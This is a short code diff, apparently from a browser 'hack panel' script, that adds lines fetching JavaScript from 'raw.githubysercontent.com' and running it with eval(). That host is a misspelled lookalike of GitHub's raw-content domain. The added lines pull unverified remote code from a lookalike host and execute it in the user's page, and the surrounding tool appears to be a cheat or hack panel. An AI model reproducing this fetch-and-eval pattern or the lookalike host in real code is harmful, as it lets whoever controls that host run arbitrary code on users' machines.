@@ -56,7 +56,9 @@ HackLogs.push(
               .then((t) => eval(t)))
      
      
-      
+      fetch("https://raw.githubysercontent.com/RumiCreator/Rumi-Panel/main/Main/button/checklvlbutton.js",{mode: "cors"})
+               .then((res) => res.text()
+               .then((t) => eval(t)))
 
       // Credits Button
       const credits = document.createElement("button");
